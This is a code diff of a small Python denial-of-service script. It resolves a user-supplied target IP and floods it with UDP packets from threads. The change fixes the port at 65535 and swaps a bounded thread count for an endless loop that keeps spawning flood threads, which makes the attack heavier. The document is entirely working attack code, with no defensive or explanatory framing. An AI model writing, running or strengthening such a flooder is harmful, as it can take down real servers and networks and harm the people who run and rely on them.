@@ -2,8 +2,7 @@ import threading
 import socket
 
 ip = socket.gethostbyname(input("IP: "))
-port = int(input("Port: "))
-threads = int(input("Threads: "))
+port = 65535
 
 
 def l7_udp():
@@ -17,12 +16,12 @@ def l7_udp():
         else:
             print(f"\033[32m[+]\033[0m L7 UDP Packet sent -> {ip}:{port}")
 
+        s.close()
+
     except Exception as err:
         print("\033[31m[-]\033[0m", err)
 
 
-for i in range(threads):
+while True:
     t = threading.Thread(target=l7_udp)
     t.start()
-
-input("")
